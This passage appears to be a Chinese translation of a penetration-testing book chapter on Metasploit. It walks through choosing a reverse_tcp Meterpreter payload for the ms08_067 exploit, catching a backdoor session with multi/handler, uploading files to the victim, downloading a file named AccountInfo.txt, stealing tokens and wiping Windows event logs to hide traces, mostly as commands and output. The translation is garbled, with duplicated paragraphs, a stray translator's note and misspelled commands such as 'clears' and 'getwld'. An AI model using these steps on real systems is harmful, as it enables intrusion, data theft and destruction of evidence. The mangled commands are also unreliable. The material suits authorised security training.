
现在我们已经看到了如何选择漏洞利用以及如何设置选项。在许多漏洞中，我们还需要设置 `payload`（攻击载荷）。`Metasploit` 提供了许多不同的 `payload` 供使用。要查看它们，只需输入 `show payloads`：

## Picking a Payload

如果不能对被攻击的机器做什么，那么攻击它的乐趣何呢？`Payload` 允许你对被攻击的系统进行某些功能性操作。

```bash
msf exploit(ms08_067_netapi) > show payloads
Compatible Payloads
===================
Name                         option Date Rank Description
generic/custom               normal  Custom
generic/debug_trap           normal  Trap
generic/shell_bind_tcp      normal  Shell Bind TCP
generic/shell_reverse_tcp   normal  Reverse TCP
tight/tight_loop             normal  Inline
windows/dllinject/bind_ipv6 normal DLL Injection, Bind TCP Stager (IPv6)
windows/dllinject/bind_tcp normal
```

你可以输入 `set payload` 并按两次键。这将提示 `Metasploit` 询问你是否想查看所有可用的 `payload`：大多数 `payload` 都以“操作系统/Shell 类型”的格式列出如下所示：

- `set payload/osx/x86/reverse_tcp`

- `set payload/linux/x64/reverse_tcp`

- `set payload/windows/shell_reverse_tcp`

- `set payload/windows/meterpreter/reverse_tcp`

只需为你的目标选择正确的操作系统并挑选你需要的 `payload` 即可。最流行的 `payload` 类型是 `shell`，无论是普通 `shell` 还是 `Meterpreter shell`。如果我们需要一个远程终端 `shell` 来运行命令，请使用标准 `shell`。如果你想要操作会话并运行扩展命令的能力，那么你会想要 `Meterpreter shell`（我们将在下一章进一步讨论）。`payload` 回到攻击系统的通信方式有多种。我通常更倾向于 `reverse_tcp shell`，因为它们一旦在目标系统上执行，它们就会让攻击机器连接到我们的 `Kali` 系统。这样做的一个优势是，由于是受害者机器“主动”发起连接，通常不会被防火墙拦截，而来自外部的连接会被拦截。一旦确定了想要使用哪个 `payload`，就可以使用 `set` 命令来设置它。

- 6. 那么对于我们的示例，让我们为 `Windows` 系统使用 `Meterpreter shell` 并通过 `TCP` 连接回我们：

```bash
msf exploit(win_067_api) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```

现在 `payload` 已经设置好，再次执行 `show options` 将显示我们确实设置了目标值：

## Setting Payload

在设置好 `payload` 后，我们还需要设置选项。在许多漏洞中，我们还需要设置 `payload`。`Metasploit` 提供了许多不同的 `payload` 供使用。要查看它们，只需输入 `show payloads`：

（注：此处由于原文逻辑重复，翻译已根据上下文对齐）

- 7. 既然 `payload` 设置好，使用 `set` 命令设置：

```bash
msf exploit(ms08_067_netapi) > exploit
```

在这段关于 `Metasploit` 相当长的介绍中，我们学习了如何执行框架的一些基本功能，以便我们发现并利用漏洞。我们还简要讨论了载荷（`payload`）的使用以及必要的设置。

`Metasploit` 能够做很多事情；我们只是简要地过了一些较基础的核心功能。

再次，如果你在此时感到迷茫，请不要恐慌！我们稍后会更详细地介绍整个 `Meterpreter` 利用过程。

接下来，我们将讨论 `Meterpreter shell`，这是一个强大且有趣的界面，我们可以用它来操控我们成功利用的系统。

# 第 4 章 – Meterpreter Shell

### 资源

- `http://en.wikibooks.org/wiki/Metasploit/MeterpreterClient`

- `http://cyberarms.wordpress.com/2013/02/03/remotely-recording-speech-and-turning-into-searchable-text-with-metasploit-watson/`

### 简介

在成功利用漏洞后，`Meterpreter shell` 允许你结合完整的远程 `shell` 来执行许多不同的功能。

`Meterpreter` 用于在获得远程连接后操控系统，因此取决于你的目标；`Meterpreter shell` 通常比直接的远程终端 `shell` 更优。

`Meterpreter` 为我们提供了一系列命令和实用程序，可以极大辅助安全测试。例如，有命令可以提取密码哈希值并从系统中收集数据和设置。

`Meterpreter` 中还包含一些有趣的工具，例如，你可以打开用户的摄像头并拍摄快照，打开远程麦克风，甚至可以获取用户正在操作的桌面截图。

在本节中，我们将快速介绍 `Meterpreter shell` 及其部分功能。

## Meter Meterpreter 命令

让我们从一台被欺骗运行带有后门的程序开始（要查看如何创建规避反病毒软件的后门，请参见“Veil”章节）。执行后，后门程序连接到我们的 `Kali` 系统并创建了一个会话。然后我们自动进入活动会话，如下：

```
msf > use multi/handler
msf exploit(handler) > set payload windows/meterpreter/reverse_tcp
payload = windows/meterpreter/reverse_tcp
msf exploit(handler) > set host 192.168.1.142
192.168.1.142
msf exploit(handler) > set lport 4000
lport = 4000
msf exploit(handler) > exploit

[*] Started reverse handler on 192.168.1.142:4000
[*] Starting the payload handler...
[*] Sending stage (77048 bytes) to 192.168.1.132
[*] Meterpreter session 1 opened (192.168.1.142:4000 -> 192.168.1.132:49176) at 2013-10-20 14:45:55 -0400
```

连接到会话后，我们将得到一个 `Meterpreter` 提示符：

```
meterpreter >
```

好的，让我们看看 `Meterpreter` 能做什么，让我们从使用帮助命令开始查看有什么

`meterpreter > help`

当我们这样做时，我们看到命令被分成了不同的部分。

命令有：

- 核心命令

- 文件系统命令

- 网络命令

- 系统命令

- 用户界面命令

- 摄像头命令

- 以及三个特权 `Priv` 命令

我们不会涵盖所有的命令，但将稍微深入查看其中几个。阅读所有命令以基本了解它们能做什么是一个好主意。

## 核心命令

| 命令 | 说明 |
|---|---|
| `?` | 帮助菜单 |
| `background` | 将当前会话 de-meterpreter 脚本放入后台 |
| `bgkill` | 杀死后台 meterpreter 脚本 |
| `bglist` | 列出后台脚本 |
| `bgrun` | 作为后台线程执行 meterpreter 脚本 |
| `channel` | 显示活动通道的信息 |
| `close` | 关闭通道 |
| `disable_unicode` | 禁用 unicode 字符串的编码 |
| `enable_unicode` | 启用 unicode 字符串的编码 |
| `exit` | 终止 meterpreter 会话 |
| `help` | 帮助菜单 |
| `info` | 显示后处理模块 `Post-module` 的信息 |
| `interact` | 与通道进行交互 |
| `ir` | 这里的脚本会话 |
| `load` | 载入一个或多个 meterpreter 扩展 |
| `migrate` | 将服务器迁移到另一个进程 |
| `quit` | 终止 meterpreter 会话 |
| `read` | 从通道读取数据 |
| `resource` | 运行存储在文件中的命令 |
| `run` | 执行 meterpreter 脚本或后处理模块 |
| `write` | 向通道写入数据 |

作为初级用户，你可能只会使用此列表中的 `background`, `help`, `load`, `migrate`, `run` 和 `exit`：

- `Background` - `background` 允许你将会话放入后台，这样你可以返回 `msf` 提示符或访问其他会话。

```
meterpreter > background
[*] exploit (handler) > 
msf exploit(handler) >
```

你只需使用 `session -i <session #>` 命令即可返回你的会话。

- `Load and Run` – 这些命令允许你在 `Meterpreter` 内部使用额外的模块和命令。

- `Exit` – 退出 `Meterpreter`。

## 文件系统命令

当你拥有 `Meterpreter shell` 时，基本上是在处理两个系统：本地和远程。文件系统命令允许你与这两者进行交互。基本上你可以使用标准的 `Linux` 命令来移动和使用文件系统。你如何区分本地系统和你所连接的远程系统呢？所有命令都认为在**远程**系统上执行。因此，为了列出远程系统的目录，只需使用 `ls` 命令：

```
meterpreter > ls
你变得越熟练，就越能列出: C:\Users\Fred\Desktop

Mode Size Last modified Name
40555/r-xr-xr-x  0  dir     2013-10-20 14:45:48 -0400
40777/r-xr-xr-x  0  dir     2013-08-16 09:14:33 -0400
10777/r-xr-rw 3250  fil     2013-10-11 18:49:44 -0400
10777/r-xr-rw 3226  fil     2013-10-20 14:43:36 -0400  Evil.bat
10866/r-xr-rw 282   dir     2013-09-25 02:44:44 -0400  Cute.bat
desktop.ini
```

如果我们在远程机器上创建一个名为 `test` 的目录，我们可以导航到它，然后列出内容：

```
meterpreter > mkdir test
Creating directory: cd test
meterpreter > cd test
meterpreter > ls
Listing: C:\Users\Fred\Desktop
Mode Size Last modified Name
40777/r-xr-xr-x  0  dir     2013-10-20 14:45:48 -0400
40555/-r-xr-xr-x  0  dir     2013-10-20 34:45 -0400
```

如果我们在远程机器上创建一个名为 `test` 的目录，我们可以进入它，然后列出内容。

你需要在本地文件系统中移动时，可以使用以下命令：

- `Getwld` & `lpwd` – 获取显示本地工作目录

- `Lcd` – 本地目录

所以如果我们想检查本地工作目录并进入我们的 `Kali` 目录，我们可以这样做：

```
meterpreter > lpwd
/root
meterpreter > cd Desktop
meterpreter > getwld
/root/Desktop
```

`Download` 允许从目标系统下载文件，相反，`upload` 允许你向远程系统发送文件。所以如果我们想上传文件，只需连接到你想发送的本地和远程目录，并文件名执行 `upload` 命令，如下所示：

```
meterpreter > cd Desktop
meterpreter > lpwd
/root
meterpreter > cd test
meterpreter > pwd
C:\Users\Fred\Desktop\test
meterpreter > upload Tools
[*] uploading  : Tools -> Tools
[*] uploaded  : Tools -> Tools
meterpreter > ls
Listing: C:\Users\Fred\Desktop\test
Mode Size Last modified Name
40777/rwxrwxr-  0  dir     2013-10-22 08:15:25 -0400
40555/-r-xr-xr-x  0  dir     2013-10-22 08:12:36 -0400
100666/rw-rw-rw--  0  file            2013-10-22  08:15:25 -0400  Tools
meterpreter > 
```

我们连接到了带有工具文件的 `Kali` 机器上的 `Desktop`。然后我们连接到目标上的 `test` 目录，并简单地使用 `upload` 命令传输文件。

`Download` 的方法相同，只需使用 `download` 和文件名从远程系统提取文件并存储在你的本地 `Kali` 机器上：

```
interpreter > download AccountInfo.txt
[*] downloading: AccountInfo.txt -> AccountInfo.txt
[*] downloaded : AccountInfo.txt -> AccountInfo.txt
```

现在让我们看看网络命令。

## 网络命令

这些命令允许你显示和操作基本的网络功能。

- `Arp` - 显示远程 MAC 地址到实际 IP 地址的列表。

- `Ifconfig` & `ipconfig` 都显示远程系统上的任何网络接口。

- `Netstat` - 显示活动网络连接列表。

- `Portfwd` 和 `route` 允许你进行一些高级路由攻击。虽然我们书中书中介绍这些，但使用这两个命令允许你利用已利用的机器进行跳板，或攻击目标网络或网络中的其他机器。

| 命令 | 说明 |
| :--- | :--- |
| `clears` | 清除事件日志 |
| `drop_token` | 放弃任何活跃的身份冒充令牌 |
| `execute` | 执行命令 |
| `getid` | 获取当前进程标识符 |
| `getpriv` | 尝试为当前进程启用所有权限 |
| `getuid` | 获取运行服务器的用户 |
| `kill` | 终止进程 |
| `ps` | 列出运行中的进程 |
| `reboot` | 重启远程计算机 |
| `reg` | 修改并与注册表交互 |
| `rev2shelf` | 在远程机器上执行 RevertToSIF |
| `shutdown` | 关闭远程计算机 |
| `steal_token` | 尝试从目标进程窃取身份冒充令牌 |
| `suspend` | 挂起或恢复进程列表 |
| `sysinfo` | 获取远程系统信息，如操作系统 |

**CLEAR** – 这个实用的小命令将尝试清除远程计算机上的日志。

我们想要擦除自己的痕迹并清除目标机器上的系统日志。如果我们查看 `Windows 7` 系统侧的日志，可以看到它充满了事件：

![](img/3ef0f51cacb0127e8ad0ea42f248a9fe_48_0.png)

这些事件中可能包含我们做过的事情。因此我们可以在 `Kali` 系统上输入 `clears` 来远程清除日志。

```bash
> clears
[*] Wiping 1587 records from Application...
[*] Wiping 5148 records from System...
[*] Wiping 4151 records from Security...
```

应用程序（Application）、系统（System）和安全（Security）日志已被清空。如果我们再次查看安全日志，只显示了一条记录，“Log Clear”：

![](img/3ef0f51cacb0127e8ad0ea42f248a9fe_48_1.png)

现在显然，对于任何分析日志的人来说，这都会非常显眼。但如果你删除了某些事件，你可以清除整个日志。

## GETPID & PS 命令

在使用 `Meterpreter` 时，你可能会经常地使用两个命令是 `getpid` 和 `ps`。

- `getpid` – 告诉你的 `shell` 运行的进程 ID

- `ps` – 列出远程系统上运行的所有进程

所以如果我输入 `getpid`，我会看到这个：

```bash
meterpreter > getpid
Current pid: 3824
```

这是我们的 `shell` 正在使用的进程 ID。如果我输入 `ps`，我就可以看到所有的进程：

![](img/3ef0f51cacb0127e8ad0ea42f248a9fe_49_0.png)
